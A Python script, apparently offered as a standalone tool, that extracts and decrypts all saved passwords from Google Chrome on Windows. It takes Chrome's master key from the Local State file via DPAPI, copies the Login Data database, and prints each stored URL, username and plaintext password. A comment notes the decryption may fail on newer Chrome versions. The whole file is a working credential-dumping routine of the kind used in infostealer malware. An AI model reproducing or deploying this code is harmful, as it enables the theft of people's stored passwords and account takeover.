import os
import json
from base64 import b64decode
import sqlite3
from win32crypt import CryptUnprotectData  # ty:ignore[unresolved-import]
from Cryptodome.Cipher import AES
import shutil
# from icecream import ic

def getMasterKey(local_state):
    with open(local_state, "r") as f:
        state = json.loads(f.read())
    master_key = b64decode(state["os_crypt"]["encrypted_key"])[5:]
    # ic(master_key)
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    # ic(master_key)
    return master_key

def decryptPassword(buff, master_key):
    IV = buff[3:15]
    cipher_text = buff[15:]
    aes = AES.new(master_key, AES.MODE_GCM, IV)
    plain_text = aes.decrypt(cipher_text)

    # ic(IV, cipher_text, plain_text)

    password = plain_text[:-16].decode() # Unfortunately, there is an error orignating from here, otherwise everything else seems to be working well...perhaps a new chrome version
    
    return password

path = os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data")
local_state = os.path.join(path, "Local State")
login_data = os.path.join(path, "Default", "Login Data")
# ic(login_data)

master_key = getMasterKey(local_state)
shutil.copy2(login_data, "Login Data")
connection = sqlite3.connect("Login Data")
cursor = connection.cursor()

try:
    sql = "SELECT action_url, username_value, password_value FROM logins"
    cursor.execute(sql)

    for record in cursor.fetchall():
        url = record[0]
        user_name = record[1]
        cipher_text = record[2]

        # print()
        # ic(url, user_name, cipher_text)

        try:
            decrypted_password = decryptPassword(cipher_text, master_key)
            if len(user_name) > 0:
                print(url)
                print(f"\tUsername: {user_name}")
                print(f"\tPassword: {decrypted_password}")
        except Exception as e:
            # ic(e)
            print(e)
            continue
except Exception as e:
    print(e)
    pass

cursor.close()
connection.close()

try:
    os.remove("Login Data")
except Exception as e:
    print(e)
    pass